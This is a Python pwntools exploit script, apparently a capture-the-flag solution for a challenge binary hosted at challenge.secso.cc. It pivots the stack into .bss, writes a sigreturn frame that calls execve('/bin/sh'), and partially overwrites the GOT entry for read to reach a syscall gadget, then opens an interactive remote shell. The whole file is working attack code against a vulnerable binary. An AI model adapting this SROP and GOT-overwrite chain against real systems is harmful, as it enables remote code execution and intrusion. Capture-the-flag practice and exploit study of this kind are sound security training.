
#!/usr/bin/env python3
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "challenge.secso.cc", 8003


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *main+42
b *main+43
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def srop(binsh, rip=None, rsp=None):
    rop = ROP(elf)
    rip = rip if rip else rop.find_gadget(['syscall'])[0]
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve            # syscall number for execve()
    frame.rdi = binsh         # pointer to "/bin/sh" 
    frame.rsi = 0             # NULL
    frame.rdx = 0             # NULL
    frame.rip = rip        # syscall instruction
    frame.rsp = rsp        # stack pointer
    return bytes(frame)


def exploit(i):
    # mannikebab's solution 
    global io
    io = initialize()
    leak("Bss", hex(elf.bss()))
    with log.progress("Preparing gadgets"), context.silent:
        bin_sh = elf.bss(0xe8)
        target = elf.got["read"]
    
        rop = ROP(elf)

        leave_ret = nsa(elf, "leave ; ret")
        ret = rop.ret.address
        frame = srop(binsh=bin_sh, rip=ret, rsp=target)

        rop.rsi = target + 8 # After got read
        rop.read()
        rop.rsi = target - 14 # rax = 0xf
        rop.read()
        rop.rbp = target - 8

    with log.progress("Move rsp to bss section"), context.silent:
        offset = 20 - 8
        payload = flat({offset:[elf.bss(0x800) + 0xc, elf.sym["main"] + 12]}, filler=b"\x00")
        s(payload.ljust(0x200, b"\x00"))
        sleep(0.5)


    with log.progress("Overwrite bss with srop and then read to syscall address"), context.silent:
        payload = flat({offset:[0, rop.chain(), leave_ret]}, filler=b"\x00")
        s(payload.ljust(0x200, b"\x00"))
        sleep(0.5)
 
        s(frame + b"/bin/sh\0") # SROP
        sleep(0.5)

        debug()
        s(b"A"*6 + p64(ret) + p8(i)) # Overwrite got read -> syscall instruction
        sleep(0.5)
        sl("ls")
        if len(io.recvline(timeout=1)) > 0:
            io.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        exploit(0xf9)

        # for i in range(0x0, 0x100):
        #     try:
        #         print(f"==== Try {i} ====")
        #         exploit(i)
        #     except EOFError:
        #         pass
        #     io.close()
    else:
        exploit(0x0)
